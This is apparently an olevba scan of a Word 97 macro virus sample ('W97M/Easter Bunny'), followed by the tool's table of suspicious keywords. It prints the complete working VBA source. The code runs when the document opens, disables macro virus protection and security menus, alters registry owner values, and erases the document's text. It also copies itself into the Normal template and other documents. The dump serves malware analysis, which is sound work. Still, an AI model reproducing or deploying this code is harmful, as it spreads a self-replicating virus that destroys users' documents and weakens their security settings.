olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Chameleon.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Chameleon.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Easter_Bunny()
' W97M/Easter Bunny: by Total Konfuzion
' Should spread under Word2000
' Greetingz from the Easter Bunny

    On Error Resume Next
    
    Dim BlankLine
    
    If ActiveDocument.Name <> "EB.doc" Then
        Options.BlueScreen = (Rnd * 0) + 1
        
        With Selection
            .HomeKey unit:=wdStory
            .EndKey unit:=wdStory, Extend:=wdExtend
            .Delete unit:=wdCharacter, Count:=(Rnd * 0) + 1
        End With
        
        With Selection
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Font.Name = "Arial"
            .Font.Bold = (Rnd * 0) + 1
            .Font.Size = (Rnd * 0) + 20
            For BlankLine = 1 To 8
                Selection.TypeParagraph
            Next BlankLine
            .TypeText Text:="()...()"
            .TypeParagraph
            .TypeText Text:="( ' = ' )"
            .TypeParagraph
            .TypeText Text:="(''')(''')"
            For BlankLine = 1 To 3
                Selection.TypeParagraph
            Next BlankLine
            .Font.Name = "Comic Sans MS"
            .TypeText Text:="Happy Easter from the Easter Bunny.. !!"
            .Font.Bold = (Rnd * 0)
            .HomeKey unit:=wdStory
        End With
    End If
End Sub
Private Sub Document_Open()
    On Error Resume Next
    
    If Day(Now) = Minute(Now) Then MsgBox "Your system is infected with the Easter Bunny virus.   >8)", vbExclamation + vbSystemModal, "W97M/EasterBunny"
    
    With Options
        .VirusProtection = (Rnd * 0)
        .SaveNormalPrompt = (Rnd * 0)
        .ConfirmConversions = (Rnd * 0)
    End With
    
    With System
        .PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Total Konfuzion   >8)"
        .PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "W97M/EasterBunny"""
    End With
    
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Security\", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = (Rnd * 0)
    Else
        CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
        CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
        CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
    End If
    
    With Application
        .EnableCancelKey = wdCancelDisabled
        .UserName = "Total Konfuzion"
        .UserInitials = "TD"
        .UserAddress = "W97M/EasterBunny"
    End With
    
    Call Easter_Bunny
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W97M/EasterBunny") = "by Total Konfuzion   >8)"
    
    If ThisDocument = ActiveDocument Then Set Infect = NormalTemplate Else Set Infect = ActiveDocument
    
    EB = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    
    Set Dest = Infect.VBProject.VBComponents.Item(1).CodeModule
    Dest.DeleteLines 1, Dest.CountOfLines
    Dest.AddFromString EB
    
    If Infect = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub HelpAbout()
    MsgBox " « ¤ ° =  Easter Bunny virus.. !!  = ° ¤ »" + Chr(10) + "-------------------------------------------------------------" + Chr(10) + Chr(10) + "         -Total Konfuzion-", vbInformation + vbSystemModal, "Happy Easter from the.."
    Dialogs(wdDialogHelpAbout).Show
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

